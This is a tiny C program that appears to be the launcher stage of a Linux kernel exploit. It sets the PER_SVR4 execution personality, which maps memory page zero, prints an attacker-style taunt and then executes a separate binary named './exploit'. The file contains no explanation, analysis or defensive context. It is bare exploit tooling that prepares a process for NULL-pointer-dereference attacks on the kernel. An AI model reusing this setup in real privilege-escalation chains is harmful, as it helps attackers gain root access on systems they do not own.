#include <sys/personality.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
	if (personality(PER_SVR4) < 0) {
		perror("personality");
		return -1;
	}

	fprintf(stderr, "padlina z lublina!\n");

	execl("./exploit", "exploit", 0);
}


